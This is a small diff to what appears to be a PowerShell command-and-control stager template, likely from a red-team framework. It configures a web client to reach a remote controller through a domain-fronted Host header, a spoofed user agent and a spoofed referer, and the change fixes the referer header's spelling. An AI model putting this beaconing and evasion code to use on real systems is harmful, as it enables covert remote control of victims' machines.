@@ -52,7 +52,7 @@ $h="#REPLACEDOMAINFRONT#"
 if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
 elseif($h){$script:s="https://$($h)#REPLACECONNECT#";$script:sc="https://$($h)"}
 $wc.Headers.Add("User-Agent","#REPLACEUSERAGENT#")
-$wc.Headers.Add("Referrer","#REPLACEREFERER#")
+$wc.Headers.Add("Referer","#REPLACEREFERER#")
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true);
 if ($username -and $password) {
